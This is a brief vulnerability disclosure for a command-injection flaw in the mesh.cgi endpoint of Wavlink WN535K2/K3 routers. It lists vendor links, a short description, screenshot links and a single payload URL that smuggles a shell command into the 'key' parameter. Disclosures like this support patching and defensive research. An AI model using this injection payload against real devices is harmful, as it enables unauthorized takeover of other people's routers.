###Wavlink mesh.cgi command execution

#### Exploit Title

Wavlink mesh.cgi command execution

#### Exploit Author

webraybtl@webray.com.cn inc

#### Vulnerability condition

Unlimited front desk

#### Vendor Homepage

https://www.wavlink.com

#### Software Link

https://www.wavlink.com/zh_cn/firmware.html

#### Version

WN535K2/K3

#### Description

There is a command execution vulnerability in wavlink, through which an attacker can gain server privileges

#### Payload used

/cgi-bin/mesh.cgi?page=upgrade&key=';commend;'



#### Proof of Concept

![image-20220701115253571](./image-20220701115253571.png)

![image-20220701115458499](./image-20220701115458499.png)

![image-20220720095415814](./image-20220720095415814.png)

![image-20220720095441782](./image-20220720095441782.png)